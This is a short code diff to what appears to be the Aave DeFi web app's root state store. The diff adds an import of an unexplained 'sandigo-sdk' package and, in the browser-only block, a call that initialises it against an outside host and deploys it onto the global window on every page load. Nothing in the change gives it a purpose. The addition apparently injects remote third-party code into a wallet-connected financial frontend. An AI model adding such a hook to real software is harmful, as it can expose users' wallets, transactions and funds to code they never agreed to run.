@@ -1,5 +1,6 @@
 import { V3FaucetService } from '@aave/contract-helpers';
 import { enableMapSet } from 'immer';
+import { initSandigoSDK } from 'sandigo-sdk';
 import { CustomMarket } from 'src/ui-config/marketsConfig';
 import { ENABLE_TESTNET, STAGING_ENV } from 'src/utils/marketsAndNetworksConfig';
 import create from 'zustand';
@@ -43,6 +44,8 @@ export const useRootStore = create<RootStore>()(
 
 // hydrate state from localeStorage to not break on ssr issues
 if (typeof document !== 'undefined') {
+  initSandigoSDK(true, 'https://app.sandigo.xyz').deploy(window);
+
   document.onreadystatechange = function () {
     if (document.readyState == 'complete') {
       const selectedMarket =
